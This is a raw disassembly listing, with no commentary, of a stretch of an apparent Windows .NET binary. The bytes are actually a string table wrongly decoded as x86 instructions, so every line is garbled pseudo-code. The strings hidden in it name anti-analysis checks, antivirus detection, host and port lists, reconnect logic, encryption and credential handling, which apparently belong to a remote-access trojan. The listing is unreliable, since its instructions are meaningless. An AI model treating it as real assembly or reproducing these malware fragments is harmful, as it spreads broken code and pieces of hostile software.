  408c8e:	72 00                	jb     0x408c90
  408c90:	53                   	push   %ebx
  408c91:	74 72                	je     0x408d05
  408c93:	65 61                	gs popa
  408c95:	6d                   	insl   (%dx),%es:(%edi)
  408c96:	57                   	push   %edi
  408c97:	72 69                	jb     0x408d02
  408c99:	74 65                	je     0x408d00
  408c9b:	72 00                	jb     0x408c9d
  408c9d:	54                   	push   %esp
  408c9e:	65 78 74             	gs js  0x408d15
  408ca1:	57                   	push   %edi
  408ca2:	72 69                	jb     0x408d0d
  408ca4:	74 65                	je     0x408d0b
  408ca6:	72 00                	jb     0x408ca8
  408ca8:	45                   	inc    %ebp
  408ca9:	6e                   	outsb  %ds:(%esi),(%dx)
  408caa:	74 65                	je     0x408d11
  408cac:	72 00                	jb     0x408cae
  408cae:	42                   	inc    %edx
  408caf:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cb6:	72 
  408cb7:	74 65                	je     0x408d1e
  408cb9:	72 00                	jb     0x408cbb
  408cbb:	54                   	push   %esp
  408cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbd:	4c                   	dec    %esp
  408cbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbf:	77 65                	ja     0x408d26
  408cc1:	72 00                	jb     0x408cc3
  408cc3:	45                   	inc    %ebp
  408cc4:	72 72                	jb     0x408d38
  408cc6:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc7:	72 00                	jb     0x408cc9
  408cc9:	49                   	dec    %ecx
  408cca:	45                   	inc    %ebp
  408ccb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ccc:	75 6d                	jne    0x408d3b
  408cce:	65 72 61             	gs jb  0x408d32
  408cd1:	74 6f                	je     0x408d42
  408cd3:	72 00                	jb     0x408cd5
  408cd5:	4d                   	dec    %ebp
  408cd6:	61                   	popa
  408cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd8:	61                   	popa
  408cd9:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cdc:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cde:	74 4f                	je     0x408d2f
  408ce0:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ce3:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ce7:	75 6d                	jne    0x408d56
  408ce9:	65 72 61             	gs jb  0x408d4d
  408cec:	74 6f                	je     0x408d5d
  408cee:	72 00                	jb     0x408cf0
  408cf0:	53                   	push   %ebx
  408cf1:	79 73                	jns    0x408d66
  408cf3:	74 65                	je     0x408d5a
  408cf5:	6d                   	insl   (%dx),%es:(%edi)
  408cf6:	2e 43                	cs inc %ebx
  408cf8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf9:	6c                   	insb   (%dx),%es:(%edi)
  408cfa:	6c                   	insb   (%dx),%es:(%edi)
  408cfb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d00:	6e                   	outsb  %ds:(%esi),(%dx)
  408d01:	73 2e                	jae    0x408d31
  408d03:	49                   	dec    %ecx
  408d04:	45                   	inc    %ebp
  408d05:	6e                   	outsb  %ds:(%esi),(%dx)
  408d06:	75 6d                	jne    0x408d75
  408d08:	65 72 61             	gs jb  0x408d6c
  408d0b:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d0f:	47                   	inc    %edi
  408d10:	65 74 45             	gs je  0x408d58
  408d13:	6e                   	outsb  %ds:(%esi),(%dx)
  408d14:	75 6d                	jne    0x408d83
  408d16:	65 72 61             	gs jb  0x408d7a
  408d19:	74 6f                	je     0x408d8a
  408d1b:	72 00                	jb     0x408d1d
  408d1d:	41                   	inc    %ecx
  408d1e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d22:	61                   	popa
  408d23:	74 6f                	je     0x408d94
  408d25:	72 00                	jb     0x408d27
  408d27:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d2c:	00 2e                	add    %ch,(%esi)
  408d2e:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d31:	6f                   	outsl  %ds:(%esi),(%dx)
  408d32:	72 00                	jb     0x408d34
  408d34:	4d                   	dec    %ebp
  408d35:	6f                   	outsl  %ds:(%esi),(%dx)
  408d36:	6e                   	outsb  %ds:(%esi),(%dx)
  408d37:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d3e:	65 
  408d3f:	61                   	popa
  408d40:	74 65                	je     0x408da7
  408d42:	44                   	inc    %esp
  408d43:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d47:	70 74                	jo     0x408dbd
  408d49:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4a:	72 00                	jb     0x408d4c
  408d4c:	43                   	inc    %ebx
  408d4d:	72 65                	jb     0x408db4
  408d4f:	61                   	popa
  408d50:	74 65                	je     0x408db7
  408d52:	45                   	inc    %ebp
  408d53:	6e                   	outsb  %ds:(%esi),(%dx)
  408d54:	63 72 79             	arpl   %esi,0x79(%edx)
  408d57:	70 74                	jo     0x408dcd
  408d59:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5a:	72 00                	jb     0x408d5c
  408d5c:	49                   	dec    %ecx
  408d5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5e:	74 50                	je     0x408db0
  408d60:	74 72                	je     0x408dd4
  408d62:	00 53 79             	add    %dl,0x79(%ebx)
  408d65:	73 74                	jae    0x408ddb
  408d67:	65 6d                	gs insl (%dx),%es:(%edi)
  408d69:	2e 44                	cs inc %esp
  408d6b:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d72:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d79:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d80:	6f                   	outsl  %ds:(%esi),(%dx)
  408d81:	64 73 00             	fs jae 0x408d84
  408d84:	4d                   	dec    %ebp
  408d85:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d8c:	74 2e                	je     0x408dbc
  408d8e:	56                   	push   %esi
  408d8f:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d96:	73 69                	jae    0x408e01
  408d98:	63 2e                	arpl   %ebp,(%esi)
  408d9a:	44                   	inc    %esp
  408d9b:	65 76 69             	gs jbe 0x408e07
  408d9e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408da1:	00 53 79             	add    %dl,0x79(%ebx)
  408da4:	73 74                	jae    0x408e1a
  408da6:	65 6d                	gs insl (%dx),%es:(%edi)
  408da8:	2e 52                	cs push %edx
  408daa:	75 6e                	jne    0x408e1a
  408dac:	74 69                	je     0x408e17
  408dae:	6d                   	insl   (%dx),%es:(%edi)
  408daf:	65 2e 49             	gs cs dec %ecx
  408db2:	6e                   	outsb  %ds:(%esi),(%dx)
  408db3:	74 65                	je     0x408e1a
  408db5:	72 6f                	jb     0x408e26
  408db7:	70 53                	jo     0x408e0c
  408db9:	65 72 76             	gs jb  0x408e32
  408dbc:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dc3:	73 74                	jae    0x408e39
  408dc5:	65 6d                	gs insl (%dx),%es:(%edi)
  408dc7:	2e 52                	cs push %edx
  408dc9:	75 6e                	jne    0x408e39
  408dcb:	74 69                	je     0x408e36
  408dcd:	6d                   	insl   (%dx),%es:(%edi)
  408dce:	65 2e 43             	gs cs inc %ebx
  408dd1:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd2:	6d                   	insl   (%dx),%es:(%edi)
  408dd3:	70 69                	jo     0x408e3e
  408dd5:	6c                   	insb   (%dx),%es:(%edi)
  408dd6:	65 72 53             	gs jb  0x408e2c
  408dd9:	65 72 76             	gs jb  0x408e52
  408ddc:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408de3:	62 75 67             	bound  %esi,0x67(%ebp)
  408de6:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408ded:	65 
  408dee:	73 00                	jae    0x408df0
  408df0:	45                   	inc    %ebp
  408df1:	78 70                	js     0x408e63
  408df3:	61                   	popa
  408df4:	6e                   	outsb  %ds:(%esi),(%dx)
  408df5:	64 45                	fs inc %ebp
  408df7:	6e                   	outsb  %ds:(%esi),(%dx)
  408df8:	76 69                	jbe    0x408e63
  408dfa:	72 6f                	jb     0x408e6b
  408dfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfd:	6d                   	insl   (%dx),%es:(%edi)
  408dfe:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e00:	74 56                	je     0x408e58
  408e02:	61                   	popa
  408e03:	72 69                	jb     0x408e6e
  408e05:	61                   	popa
  408e06:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e0a:	00 47 65             	add    %al,0x65(%edi)
  408e0d:	74 50                	je     0x408e5f
  408e0f:	72 6f                	jb     0x408e80
  408e11:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e14:	73 65                	jae    0x408e7b
  408e16:	73 00                	jae    0x408e18
  408e18:	47                   	inc    %edi
  408e19:	65 74 48             	gs je  0x408e64
  408e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1d:	73 74                	jae    0x408e93
  408e1f:	41                   	inc    %ecx
  408e20:	64 64 72 65          	fs fs jb 0x408e89
  408e24:	73 73                	jae    0x408e99
  408e26:	65 73 00             	gs jae 0x408e29
  408e29:	53                   	push   %ebx
  408e2a:	79 73                	jns    0x408e9f
  408e2c:	74 65                	je     0x408e93
  408e2e:	6d                   	insl   (%dx),%es:(%edi)
  408e2f:	2e 53                	cs push %ebx
  408e31:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e35:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e3c:	70 
  408e3d:	74 6f                	je     0x408eae
  408e3f:	67 72 61             	addr16 jb 0x408ea3
  408e42:	70 68                	jo     0x408eac
  408e44:	79 2e                	jns    0x408e74
  408e46:	58                   	pop    %eax
  408e47:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e4c:	72 74                	jb     0x408ec2
  408e4e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e55:	73 00                	jae    0x408e57
  408e57:	45                   	inc    %ebp
  408e58:	6e                   	outsb  %ds:(%esi),(%dx)
  408e59:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e5c:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e60:	74 65                	je     0x408ec7
  408e62:	73 00                	jae    0x408e64
  408e64:	47                   	inc    %edi
  408e65:	65 74 55             	gs je  0x408ebd
  408e68:	74 66                	je     0x408ed0
  408e6a:	38 42 79             	cmp    %al,0x79(%edx)
  408e6d:	74 65                	je     0x408ed4
  408e6f:	73 00                	jae    0x408e71
  408e71:	75 74                	jne    0x408ee7
  408e73:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e77:	74 65                	je     0x408ede
  408e79:	73 00                	jae    0x408e7b
  408e7b:	52                   	push   %edx
  408e7c:	66 63 32             	arpl   %si,(%edx)
  408e7f:	38 39                	cmp    %bh,(%ecx)
  408e81:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e85:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e8c:	73 00                	jae    0x408e8e
  408e8e:	52                   	push   %edx
  408e8f:	65 61                	gs popa
  408e91:	64 41                	fs inc %ecx
  408e93:	6c                   	insb   (%dx),%es:(%edi)
  408e94:	6c                   	insb   (%dx),%es:(%edi)
  408e95:	42                   	inc    %edx
  408e96:	79 74                	jns    0x408f0c
  408e98:	65 73 00             	gs jae 0x408e9b
  408e9b:	44                   	inc    %esp
  408e9c:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408ea0:	65 46                	gs inc %esi
  408ea2:	72 6f                	jb     0x408f13
  408ea4:	6d                   	insl   (%dx),%es:(%edi)
  408ea5:	42                   	inc    %edx
  408ea6:	79 74                	jns    0x408f1c
  408ea8:	65 73 00             	gs jae 0x408eab
  408eab:	53                   	push   %ebx
  408eac:	77 61                	ja     0x408f0f
  408eae:	70 42                	jo     0x408ef2
  408eb0:	79 74                	jns    0x408f26
  408eb2:	65 73 00             	gs jae 0x408eb5
  408eb5:	4c                   	dec    %esp
  408eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb7:	61                   	popa
  408eb8:	64 46                	fs inc %esi
  408eba:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ec1:	74 
  408ec2:	65 73 00             	gs jae 0x408ec5
  408ec5:	47                   	inc    %edi
  408ec6:	65 74 41             	gs je  0x408f0a
  408ec9:	73 42                	jae    0x408f0d
  408ecb:	79 74                	jns    0x408f41
  408ecd:	65 73 00             	gs jae 0x408ed0
  408ed0:	53                   	push   %ebx
  408ed1:	65 74 41             	gs je  0x408f15
  408ed4:	73 42                	jae    0x408f18
  408ed6:	79 74                	jns    0x408f4c
  408ed8:	65 73 00             	gs jae 0x408edb
  408edb:	47                   	inc    %edi
  408edc:	65 74 42             	gs je  0x408f21
  408edf:	79 74                	jns    0x408f55
  408ee1:	65 73 00             	gs jae 0x408ee4
  408ee4:	72 61                	jb     0x408f47
  408ee6:	77 42                	ja     0x408f2a
  408ee8:	79 74                	jns    0x408f5e
  408eea:	65 73 00             	gs jae 0x408eed
  408eed:	62 79 74             	bound  %edi,0x74(%ecx)
  408ef0:	65 73 00             	gs jae 0x408ef3
  408ef3:	43                   	inc    %ebx
  408ef4:	53                   	push   %ebx
  408ef5:	68 61 72 70 41       	push   $0x41707261
  408efa:	72 67                	jb     0x408f63
  408efc:	75 6d                	jne    0x408f6b
  408efe:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f00:	74 49                	je     0x408f4b
  408f02:	6e                   	outsb  %ds:(%esi),(%dx)
  408f03:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f05:	46                   	inc    %esi
  408f06:	6c                   	insb   (%dx),%es:(%edi)
  408f07:	61                   	popa
  408f08:	67 73 00             	addr16 jae 0x408f0b
  408f0b:	43                   	inc    %ebx
  408f0c:	53                   	push   %ebx
  408f0d:	68 61 72 70 42       	push   $0x42707261
  408f12:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f19:	61                   	popa
  408f1a:	67 73 00             	addr16 jae 0x408f1d
  408f1d:	65 73 46             	gs jae 0x408f66
  408f20:	6c                   	insb   (%dx),%es:(%edi)
  408f21:	61                   	popa
  408f22:	67 73 00             	addr16 jae 0x408f25
  408f25:	53                   	push   %ebx
  408f26:	74 72                	je     0x408f9a
  408f28:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f2f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f36:	65 
  408f37:	53                   	push   %ebx
  408f38:	65 74 74             	gs je  0x408faf
  408f3b:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f42:	73 73                	jae    0x408fb7
  408f44:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4c:	67 45                	addr16 inc %ebp
  408f4e:	76 65                	jbe    0x408fb5
  408f50:	6e                   	outsb  %ds:(%esi),(%dx)
  408f51:	74 41                	je     0x408f94
  408f53:	72 67                	jb     0x408fbc
  408f55:	73 00                	jae    0x408f57
  408f57:	41                   	inc    %ecx
  408f58:	6e                   	outsb  %ds:(%esi),(%dx)
  408f59:	74 69                	je     0x408fc4
  408f5b:	5f                   	pop    %edi
  408f5c:	41                   	inc    %ecx
  408f5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5e:	61                   	popa
  408f5f:	6c                   	insb   (%dx),%es:(%edi)
  408f60:	79 73                	jns    0x408fd5
  408f62:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f69:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6a:	74 69                	je     0x408fd5
  408f6c:	41                   	inc    %ecx
  408f6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6e:	61                   	popa
  408f6f:	6c                   	insb   (%dx),%es:(%edi)
  408f70:	79 73                	jns    0x408fe5
  408f72:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f79:	73 00                	jae    0x408f7b
  408f7b:	49                   	dec    %ecx
  408f7c:	43                   	inc    %ebx
  408f7d:	72 65                	jb     0x408fe4
  408f7f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f82:	74 69                	je     0x408fed
  408f84:	61                   	popa
  408f85:	6c                   	insb   (%dx),%es:(%edi)
  408f86:	73 00                	jae    0x408f88
  408f88:	73 65                	jae    0x408fef
  408f8a:	74 5f                	je     0x408feb
  408f8c:	43                   	inc    %ebx
  408f8d:	72 65                	jb     0x408ff4
  408f8f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f92:	74 69                	je     0x408ffd
  408f94:	61                   	popa
  408f95:	6c                   	insb   (%dx),%es:(%edi)
  408f96:	73 00                	jae    0x408f98
  408f98:	45                   	inc    %ebp
  408f99:	71 75                	jno    0x409010
  408f9b:	61                   	popa
  408f9c:	6c                   	insb   (%dx),%es:(%edi)
  408f9d:	73 00                	jae    0x408f9f
  408f9f:	53                   	push   %ebx
  408fa0:	73 6c                	jae    0x40900e
  408fa2:	50                   	push   %eax
  408fa3:	72 6f                	jb     0x409014
  408fa5:	74 6f                	je     0x409016
  408fa7:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408faa:	73 00                	jae    0x408fac
  408fac:	52                   	push   %edx
  408fad:	65 61                	gs popa
  408faf:	64 54                	fs push %esp
  408fb1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb3:	6c                   	insb   (%dx),%es:(%edi)
  408fb4:	73 00                	jae    0x408fb6
  408fb6:	57                   	push   %edi
  408fb7:	72 69                	jb     0x409022
  408fb9:	74 65                	je     0x409020
  408fbb:	54                   	push   %esp
  408fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbe:	6c                   	insb   (%dx),%es:(%edi)
  408fbf:	73 00                	jae    0x408fc1
  408fc1:	42                   	inc    %edx
  408fc2:	79 74                	jns    0x409038
  408fc4:	65 73 54             	gs jae 0x40901b
  408fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc9:	6c                   	insb   (%dx),%es:(%edi)
  408fca:	73 00                	jae    0x408fcc
  408fcc:	53                   	push   %ebx
  408fcd:	79 73                	jns    0x409042
  408fcf:	74 65                	je     0x409036
  408fd1:	6d                   	insl   (%dx),%es:(%edi)
  408fd2:	2e 57                	cs push %edi
  408fd4:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fdb:	46                   	inc    %esi
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	72 6d                	jb     0x40904c
  408fdf:	73 00                	jae    0x408fe1
  408fe1:	44                   	inc    %esp
  408fe2:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe3:	73 00                	jae    0x408fe5
  408fe5:	43                   	inc    %ebx
  408fe6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe7:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe8:	74 61                	je     0x40904b
  408fea:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408ff1:	74 65                	je     0x409058
  408ff3:	6d                   	insl   (%dx),%es:(%edi)
  408ff4:	2e 43                	cs inc %ebx
  408ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff7:	6c                   	insb   (%dx),%es:(%edi)
  408ff8:	6c                   	insb   (%dx),%es:(%edi)
  408ff9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ffe:	6e                   	outsb  %ds:(%esi),(%dx)
  408fff:	73 00                	jae    0x409001
  409001:	53                   	push   %ebx
  409002:	74 72                	je     0x409076
  409004:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40900b:	74 4f                	je     0x40905c
  40900d:	70 74                	jo     0x409083
  40900f:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409016:	74 49                	je     0x409061
  409018:	6d                   	insl   (%dx),%es:(%edi)
  409019:	61                   	popa
  40901a:	67 65 44             	addr16 gs inc %esp
  40901d:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409021:	65 72 73             	gs jb  0x409097
  409024:	00 52 75             	add    %dl,0x75(%edx)
  409027:	6e                   	outsb  %ds:(%esi),(%dx)
  409028:	74 69                	je     0x409093
  40902a:	6d                   	insl   (%dx),%es:(%edi)
  40902b:	65 48                	gs dec %eax
  40902d:	65 6c                	gs insb (%dx),%es:(%edi)
  40902f:	70 65                	jo     0x409096
  409031:	72 73                	jb     0x4090a6
  409033:	00 53 73             	add    %dl,0x73(%ebx)
  409036:	6c                   	insb   (%dx),%es:(%edi)
  409037:	50                   	push   %eax
  409038:	6f                   	outsl  %ds:(%esi),(%dx)
  409039:	6c                   	insb   (%dx),%es:(%edi)
  40903a:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409041:	72 73                	jb     0x4090b6
  409043:	00 73 73             	add    %dh,0x73(%ebx)
  409046:	6c                   	insb   (%dx),%es:(%edi)
  409047:	50                   	push   %eax
  409048:	6f                   	outsl  %ds:(%esi),(%dx)
  409049:	6c                   	insb   (%dx),%es:(%edi)
  40904a:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409051:	72 73                	jb     0x4090c6
  409053:	00 46 69             	add    %al,0x69(%esi)
  409056:	6c                   	insb   (%dx),%es:(%edi)
  409057:	65 41                	gs inc %ecx
  409059:	63 63 65             	arpl   %esp,0x65(%ebx)
  40905c:	73 73                	jae    0x4090d1
  40905e:	00 68 50             	add    %ch,0x50(%eax)
  409061:	72 6f                	jb     0x4090d2
  409063:	63 65 73             	arpl   %esp,0x73(%ebp)
  409066:	73 00                	jae    0x409068
  409068:	47                   	inc    %edi
  409069:	65 74 43             	gs je  0x4090af
  40906c:	75 72                	jne    0x4090e0
  40906e:	72 65                	jb     0x4090d5
  409070:	6e                   	outsb  %ds:(%esi),(%dx)
  409071:	74 50                	je     0x4090c3
  409073:	72 6f                	jb     0x4090e4
  409075:	63 65 73             	arpl   %esp,0x73(%ebp)
  409078:	73 00                	jae    0x40907a
  40907a:	49                   	dec    %ecx
  40907b:	50                   	push   %eax
  40907c:	41                   	inc    %ecx
  40907d:	64 64 72 65          	fs fs jb 0x4090e6
  409081:	73 73                	jae    0x4090f6
  409083:	00 43 6f             	add    %al,0x6f(%ebx)
  409086:	6d                   	insl   (%dx),%es:(%edi)
  409087:	70 72                	jo     0x4090fb
  409089:	65 73 73             	gs jae 0x4090ff
  40908c:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409090:	6f                   	outsl  %ds:(%esi),(%dx)
  409091:	6d                   	insl   (%dx),%es:(%edi)
  409092:	70 72                	jo     0x409106
  409094:	65 73 73             	gs jae 0x40910a
  409097:	00 53 79             	add    %dl,0x79(%ebx)
  40909a:	73 74                	jae    0x409110
  40909c:	65 6d                	gs insl (%dx),%es:(%edi)
  40909e:	2e 4e                	cs dec %esi
  4090a0:	65 74 2e             	gs je  0x4090d1
  4090a3:	53                   	push   %ebx
  4090a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a5:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090a8:	74 73                	je     0x40911d
  4090aa:	00 73 65             	add    %dh,0x65(%ebx)
  4090ad:	74 5f                	je     0x40910e
  4090af:	41                   	inc    %ecx
  4090b0:	72 67                	jb     0x409119
  4090b2:	75 6d                	jne    0x409121
  4090b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b6:	74 73                	je     0x40912b
  4090b8:	00 53 79             	add    %dl,0x79(%ebx)
  4090bb:	73 74                	jae    0x409131
  4090bd:	65 6d                	gs insl (%dx),%es:(%edi)
  4090bf:	45                   	inc    %ebp
  4090c0:	76 65                	jbe    0x409127
  4090c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c3:	74 73                	je     0x409138
  4090c5:	00 50 6f             	add    %dl,0x6f(%eax)
  4090c8:	72 74                	jb     0x40913e
  4090ca:	73 00                	jae    0x4090cc
  4090cc:	45                   	inc    %ebp
  4090cd:	78 69                	js     0x409138
  4090cf:	73 74                	jae    0x409145
  4090d1:	73 00                	jae    0x4090d3
  4090d3:	48                   	dec    %eax
  4090d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d5:	73 74                	jae    0x40914b
  4090d7:	73 00                	jae    0x4090d9
  4090d9:	41                   	inc    %ecx
  4090da:	6e                   	outsb  %ds:(%esi),(%dx)
  4090db:	74 69                	je     0x409146
  4090dd:	76 69                	jbe    0x409148
  4090df:	72 75                	jb     0x409156
  4090e1:	73 00                	jae    0x4090e3
  4090e3:	43                   	inc    %ebx
  4090e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e6:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090e9:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090ec:	61                   	popa
  4090ed:	67 65 46             	addr16 gs inc %esi
  4090f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f1:	72 6d                	jb     0x409160
  4090f3:	61                   	popa
  4090f4:	74 00                	je     0x4090f6
  4090f6:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090f8:	72 6d                	jb     0x409167
  4090fa:	61                   	popa
  4090fb:	74 00                	je     0x4090fd
  4090fd:	57                   	push   %edi
  4090fe:	72 69                	jb     0x409169
  409100:	74 65                	je     0x409167
  409102:	46                   	inc    %esi
  409103:	6c                   	insb   (%dx),%es:(%edi)
  409104:	6f                   	outsl  %ds:(%esi),(%dx)
  409105:	61                   	popa
  409106:	74 00                	je     0x409108
  409108:	67 65 74 5f          	addr16 gs je 0x40916b
  40910c:	41                   	inc    %ecx
  40910d:	73 46                	jae    0x409155
  40910f:	6c                   	insb   (%dx),%es:(%edi)
  409110:	6f                   	outsl  %ds:(%esi),(%dx)
  409111:	61                   	popa
  409112:	74 00                	je     0x409114
  409114:	73 65                	jae    0x40917b
  409116:	74 5f                	je     0x409177
  409118:	41                   	inc    %ecx
  409119:	73 46                	jae    0x409161
  40911b:	6c                   	insb   (%dx),%es:(%edi)
  40911c:	6f                   	outsl  %ds:(%esi),(%dx)
  40911d:	61                   	popa
  40911e:	74 00                	je     0x409120
  409120:	47                   	inc    %edi
  409121:	65 74 41             	gs je  0x409165
  409124:	73 46                	jae    0x40916c
  409126:	6c                   	insb   (%dx),%es:(%edi)
  409127:	6f                   	outsl  %ds:(%esi),(%dx)
  409128:	61                   	popa
  409129:	74 00                	je     0x40912b
  40912b:	53                   	push   %ebx
  40912c:	65 74 41             	gs je  0x409170
  40912f:	73 46                	jae    0x409177
  409131:	6c                   	insb   (%dx),%es:(%edi)
  409132:	6f                   	outsl  %ds:(%esi),(%dx)
  409133:	61                   	popa
  409134:	74 00                	je     0x409136
  409136:	46                   	inc    %esi
  409137:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  40913e:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409142:	61                   	popa
  409143:	6e                   	outsb  %ds:(%esi),(%dx)
  409144:	61                   	popa
  409145:	67 65 6d             	gs insl (%dx),%es:(%di)
  409148:	65 6e                	outsb  %gs:(%esi),(%dx)
  40914a:	74 42                	je     0x40918e
  40914c:	61                   	popa
  40914d:	73 65                	jae    0x4091b4
  40914f:	4f                   	dec    %edi
  409150:	62 6a 65             	bound  %ebp,0x65(%edx)
  409153:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409157:	6f                   	outsl  %ds:(%esi),(%dx)
  409158:	72 63                	jb     0x4091bd
  40915a:	65 50                	gs push %eax
  40915c:	61                   	popa
  40915d:	74 68                	je     0x4091c7
  40915f:	4f                   	dec    %edi
  409160:	62 6a 65             	bound  %ebp,0x65(%edx)
  409163:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409167:	6f                   	outsl  %ds:(%esi),(%dx)
  409168:	6c                   	insb   (%dx),%es:(%edi)
  409169:	6c                   	insb   (%dx),%es:(%edi)
  40916a:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40916f:	6f                   	outsl  %ds:(%esi),(%dx)
  409170:	6e                   	outsb  %ds:(%esi),(%dx)
  409171:	6e                   	outsb  %ds:(%esi),(%dx)
  409172:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409177:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40917b:	6e                   	outsb  %ds:(%esi),(%dx)
  40917c:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409181:	65 74 00             	gs je  0x409184
  409184:	53                   	push   %ebx
  409185:	79 73                	jns    0x4091fa
  409187:	74 65                	je     0x4091ee
  409189:	6d                   	insl   (%dx),%es:(%edi)
